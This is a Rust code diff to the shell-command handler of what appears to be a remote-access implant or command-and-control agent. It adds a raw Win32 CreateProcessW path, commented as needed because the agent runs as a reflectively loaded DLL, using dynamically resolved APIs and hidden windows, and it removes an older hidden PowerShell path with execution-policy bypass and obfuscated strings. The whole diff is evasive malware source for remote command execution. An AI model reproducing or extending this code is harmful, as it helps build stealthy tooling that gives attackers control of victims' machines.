@@ -355,8 +355,10 @@ fn cmd_env() -> String {
 
 // ── SHELL ─────────────────────────────────────────────────────────────────────
 fn cmd_shell(task: &Task, state: &Arc<AgentState>) -> TaskResponse {
+    crate::dlog!("shell", "cmd_shell entered");
     let cmd     = task.arg_str("cmd");
     let req_cwd = task.arg_str("cwd");
+    crate::dlog!("shell", "cmd='{}' req_cwd='{}'", cmd, req_cwd);
 
     let mut warn_prefix = String::new();
 
@@ -474,110 +476,194 @@ fn cmd_shell(task: &Task, state: &Arc<AgentState>) -> TaskResponse {
     const CMD_TIMEOUT_SECS: u64 = 60;
     const MAX_OUTPUT_BYTES: usize = 4 * 1024 * 1024; // 4 MB hard cap
 
-    // Spawn subprocess; send its pid/handle-id to the main thread so it can be
-    // killed on timeout. Output arrives on a separate channel.
-    let cmd_owned = cmd.to_string();
-    let cwd_owned = cwd.clone();
-    let (pid_tx,  pid_rx)  = std::sync::mpsc::channel::<u32>();
-    let (out_tx,  out_rx)  = std::sync::mpsc::channel::<Result<std::process::Output, std::io::Error>>();
+    // ── Windows: use raw Win32 API (no std::thread::spawn) ──────────────────
+    // In reflective DLL context, std::thread::spawn crashes because the OS
+    // never calls DLL_THREAD_ATTACH for manually mapped DLLs, so Rust's TLS
+    // initialisation on new threads triggers an access violation.
+    #[cfg(windows)]
+    let (output, status) = unsafe {
+        use std::ptr;
+        crate::dlog!("shell", "win32 path: CreateProcessW");
 
-    std::thread::spawn(move || {
-        #[cfg(windows)]
-        let spawn_result = {
-            use std::os::windows::process::CommandExt;
+        // SECURITY_ATTRIBUTES (24 bytes x64) with bInheritHandle = TRUE
+        let mut sa = [0u8; 24];
+        *(sa.as_mut_ptr() as *mut u32) = 24;           // nLength
+        *(sa.as_mut_ptr().add(16) as *mut i32) = 1;    // bInheritHandle
+
+        // stdout pipe (1 MB buffer avoids deadlock for typical commands)
+        let mut stdout_rd: isize = 0;
+        let mut stdout_wr: isize = 0;
+        if crate::dynapi::create_pipe(&mut stdout_rd, &mut stdout_wr, sa.as_ptr(), 1024 * 1024) == 0 {
+            (format!("ERROR: CreatePipe(stdout) failed"), false)
+        } else {
+        crate::dynapi::set_handle_information(stdout_rd, 1, 0); // don't inherit read end
+
+        // stderr pipe
+        let mut stderr_rd: isize = 0;
+        let mut stderr_wr: isize = 0;
+        if crate::dynapi::create_pipe(&mut stderr_rd, &mut stderr_wr, sa.as_ptr(), 1024 * 1024) == 0 {
+            crate::dynapi::close_handle(stdout_rd);
+            crate::dynapi::close_handle(stdout_wr);
+            (format!("ERROR: CreatePipe(stderr) failed"), false)
+        } else {
+        crate::dynapi::set_handle_information(stderr_rd, 1, 0);
+
+        // STARTUPINFOW (104 bytes x64)
+        let mut si = [0u8; 104];
+        *(si.as_mut_ptr() as *mut u32) = 104;                       // cb
+        *(si.as_mut_ptr().add(60) as *mut u32) = 0x100;             // STARTF_USESTDHANDLES
+        // hStdInput = 0 (NULL)
+        *(si.as_mut_ptr().add(88) as *mut isize) = stdout_wr;       // hStdOutput
+        *(si.as_mut_ptr().add(96) as *mut isize) = stderr_wr;       // hStdError
+
+        // PROCESS_INFORMATION (24 bytes x64)
+        let mut pi = [0u8; 24];
+
+        // Build command line as UTF-16
+        let cmdline_str = format!("cmd.exe /c {}", cmd);
+        crate::dlog!("shell", "cmdline='{}'", cmdline_str);
+        let mut cmdline_w: Vec<u16> = cmdline_str.encode_utf16().chain(std::iter::once(0)).collect();
+        let cwd_w: Vec<u16> = cwd.encode_utf16().chain(std::iter::once(0)).collect();
+
+        let ok = crate::dynapi::create_process_w(
+            ptr::null(),
+            cmdline_w.as_mut_ptr(),
+            ptr::null(), ptr::null(),
+            1,              // bInheritHandles = TRUE
+            0x0800_0000,    // CREATE_NO_WINDOW
+            ptr::null(),
+            cwd_w.as_ptr(),
+            si.as_ptr(),
+            pi.as_mut_ptr(),
+        );
+        crate::dlog!("shell", "CreateProcessW returned {}", ok);
+
+        // Close write ends in parent immediately
+        crate::dynapi::close_handle(stdout_wr);
+        crate::dynapi::close_handle(stderr_wr);
+
+        if ok == 0 {
+            crate::dynapi::close_handle(stdout_rd);
+            crate::dynapi::close_handle(stderr_rd);
+            (format!("ERROR: CreateProcessW failed for: {}", cmd), false)
+        } else {
+            let h_process = *(pi.as_ptr() as *const isize);
+            let h_thread  = *(pi.as_ptr().add(8) as *const isize);
+            crate::dynapi::close_handle(h_thread);
+
+            // Wait with timeout
+            let wr = crate::dynapi::wait_for_single_object(
+                h_process, CMD_TIMEOUT_SECS as u32 * 1000,
+            );
+            let timed_out = wr != 0; // WAIT_OBJECT_0 = 0
+            crate::dlog!("shell", "WaitForSingleObject={} timed_out={}", wr, timed_out);
+
+            if timed_out {
+                crate::dynapi::terminate_process(h_process, 1);
+            }
+
+            // Read stdout
+            let mut stdout_buf = Vec::new();
+            let mut tmp = [0u8; 8192];
+            loop {
+                let mut n: u32 = 0;
+                if crate::dynapi::read_file(stdout_rd, tmp.as_mut_ptr(), tmp.len() as u32, &mut n, ptr::null_mut()) == 0 || n == 0 { break; }
+                stdout_buf.extend_from_slice(&tmp[..n as usize]);
+                if stdout_buf.len() >= MAX_OUTPUT_BYTES { break; }
+            }
+
+            // Read stderr
+            let mut stderr_buf = Vec::new();
+            loop {
+                let mut n: u32 = 0;
+                if crate::dynapi::read_file(stderr_rd, tmp.as_mut_ptr(), tmp.len() as u32, &mut n, ptr::null_mut()) == 0 || n == 0 { break; }
+                stderr_buf.extend_from_slice(&tmp[..n as usize]);
+                if stderr_buf.len() >= MAX_OUTPUT_BYTES { break; }
+            }
+
+            // Exit code
+            let mut exit_code: u32 = 0;
+            crate::dynapi::get_exit_code_process(h_process, &mut exit_code);
+            crate::dlog!("shell", "exit_code={} stdout={} stderr={}", exit_code, stdout_buf.len(), stderr_buf.len());
+
+            crate::dynapi::close_handle(h_process);
+            crate::dynapi::close_handle(stdout_rd);
+            crate::dynapi::close_handle(stderr_rd);
+
+            // Format output
+            let mut out_s = String::from_utf8_lossy(
+                &stdout_buf[..stdout_buf.len().min(MAX_OUTPUT_BYTES)]
+            ).to_string();
+            let rem = MAX_OUTPUT_BYTES.saturating_sub(out_s.len());
+            if rem > 0 && !stderr_buf.is_empty() {
+                let e = String::from_utf8_lossy(&stderr_buf[..stderr_buf.len().min(rem)]).to_string();
+                if !e.is_empty() { out_s.push_str(&e); }
+            }
+            if out_s.len() >= MAX_OUTPUT_BYTES {
+                out_s.push_str("\n[TRUNCATED: output exceeded 4 MB]");
+            }
+
+            if timed_out {
+                if out_s.is_empty() {
+                    (format!("ERROR: command timed out after {}s", CMD_TIMEOUT_SECS), false)
+                } else {
+                    out_s.push_str(&format!("\n[timed out after {}s]", CMD_TIMEOUT_SECS));
+                    (out_s, false)
+                }
+            } else if out_s.is_empty() {
+                (format!("[exit code: {}]", exit_code), exit_code == 0)
+            } else {
+                (out_s, exit_code == 0)
+            }
+        }
+        }
+        }
+    };
+
+    // ── Unix: thread-based (no reflective loading issues) ───────────────────
+    #[cfg(unix)]
+    let (output, status) = {
+        let cmd_owned = cmd.to_string();
+        let cwd_owned = cwd.clone();
+        let (out_tx, out_rx) = std::sync::mpsc::channel::<Result<std::process::Output, std::io::Error>>();
+        let (pid_tx, pid_rx) = std::sync::mpsc::channel::<u32>();
+
+        std::thread::spawn(move || {
             use std::process::Stdio;
-            let ps_args = [
-                s!("-NoProfile"), s!("-NonInteractive"), s!("-WindowStyle"), s!("Hidden"),
-                s!("-ExecutionPolicy"), s!("Bypass"), s!("-Command"), cmd_owned.clone(),
-            ];
-            std::process::Command::new(s!("powershell"))
-                .args(&ps_args)
-                .current_dir(&cwd_owned)
-                .stdout(Stdio::piped())
-                .stderr(Stdio::piped())
-                .creation_flags(0x0800_0000)
-                .spawn()
-        };
-        #[cfg(unix)]
-        let spawn_result = {
-            use std::process::Stdio;
-            std::process::Command::new("/bin/sh")
+            match std::process::Command::new("/bin/sh")
                 .args(["-c", &cmd_owned])
                 .current_dir(&cwd_owned)
                 .stdout(Stdio::piped())
                 .stderr(Stdio::piped())
                 .spawn()
-        };
-
-        match spawn_result {
-            Err(e) => { let _ = out_tx.send(Err(e)); }
-            Ok(mut child) => {
-                let _ = pid_tx.send(child.id());
-                let _ = out_tx.send(child.wait_with_output());
-            }
-        }
-    });
-
-    // Receive pid so we can kill on timeout (ignore if spawn failed — out_rx will carry the error)
-    let child_pid: Option<u32> = pid_rx.recv_timeout(std::time::Duration::from_secs(5)).ok();
-
-    let (output, status) = match out_rx.recv_timeout(std::time::Duration::from_secs(CMD_TIMEOUT_SECS)) {
-        Ok(Ok(out)) => {
-            let stdout = &out.stdout[..out.stdout.len().min(MAX_OUTPUT_BYTES)];
-            let mut s  = String::from_utf8_lossy(stdout).to_string();
-            let remaining = MAX_OUTPUT_BYTES.saturating_sub(s.len());
-            if remaining > 0 {
-                let err = String::from_utf8_lossy(&out.stderr[..out.stderr.len().min(remaining)]).to_string();
-                if !err.is_empty() { s.push_str(&err); }
-            }
-            if s.len() >= MAX_OUTPUT_BYTES {
-                s.push_str("\n[TRUNCATED: output exceeded 4 MB]");
-            }
-            if s.is_empty() { s = format!("[exit code: {}]", out.status.code().unwrap_or(-1)); }
-            (s, out.status.success())
-        }
-        Ok(Err(e)) => (format!("ERROR: exec '{}': {}", cmd, e), false),
-        Err(_) => {
-            // Timeout: kill child so it doesn't linger as an orphan.
-            if let Some(pid) = child_pid {
-                #[cfg(unix)]
-                unsafe {
-                    // Kill the shell directly. Grandchildren become orphans adopted by init;
-                    // acceptable — killing the group risks hitting the agent's own pgid.
-                    libc::kill(pid as libc::pid_t, libc::SIGKILL);
-                }
-                #[cfg(windows)]
-                unsafe {
-                    use windows_sys::Win32::Foundation::CloseHandle;
-                    let h = crate::dynapi::open_process(0x0001, 0, pid); // PROCESS_TERMINATE
-                    if h != 0 { crate::dynapi::terminate_process(h, 1); CloseHandle(h); }
+            {
+                Err(e) => { let _ = out_tx.send(Err(e)); }
+                Ok(mut child) => {
+                    let _ = pid_tx.send(child.id());
+                    let _ = out_tx.send(child.wait_with_output());
                 }
             }
-            // After kill, try to collect any partial output the process wrote
-            // before being killed (e.g. stderr from nc, curl, etc.)
-            match out_rx.recv_timeout(std::time::Duration::from_secs(2)) {
-                Ok(Ok(out)) => {
-                    let mut s = String::from_utf8_lossy(
-                        &out.stdout[..out.stdout.len().min(MAX_OUTPUT_BYTES)]
-                    ).to_string();
-                    let remaining = MAX_OUTPUT_BYTES.saturating_sub(s.len());
-                    if remaining > 0 {
-                        let err = String::from_utf8_lossy(
-                            &out.stderr[..out.stderr.len().min(remaining)]
-                        ).to_string();
-                        if !err.is_empty() {
-                            if !s.is_empty() { s.push('\n'); }
-                            s.push_str(&err);
-                        }
-                    }
-                    if s.is_empty() {
-                        (format!("ERROR: command timed out after {}s (no output)", CMD_TIMEOUT_SECS), false)
-                    } else {
-                        s.push_str(&format!("\n[timed out after {}s]", CMD_TIMEOUT_SECS));
-                        (s, false)
-                    }
+        });
+
+        let child_pid: Option<u32> = pid_rx.recv_timeout(std::time::Duration::from_secs(5)).ok();
+
+        match out_rx.recv_timeout(std::time::Duration::from_secs(CMD_TIMEOUT_SECS)) {
+            Ok(Ok(out)) => {
+                let mut s = String::from_utf8_lossy(&out.stdout[..out.stdout.len().min(MAX_OUTPUT_BYTES)]).to_string();
+                let remaining = MAX_OUTPUT_BYTES.saturating_sub(s.len());
+                if remaining > 0 {
+                    let err = String::from_utf8_lossy(&out.stderr[..out.stderr.len().min(remaining)]).to_string();
+                    if !err.is_empty() { s.push_str(&err); }
                 }
-                _ => (format!("ERROR: command timed out after {}s", CMD_TIMEOUT_SECS), false),
+                if s.is_empty() { s = format!("[exit code: {}]", out.status.code().unwrap_or(-1)); }
+                (s, out.status.success())
+            }
+            Ok(Err(e)) => (format!("ERROR: exec '{}': {}", cmd, e), false),
+            Err(_) => {
+                if let Some(pid) = child_pid {
+                    unsafe { libc::kill(pid as libc::pid_t, libc::SIGKILL); }
+                }
+                (format!("ERROR: command timed out after {}s", CMD_TIMEOUT_SECS), false)
             }
         }
     };
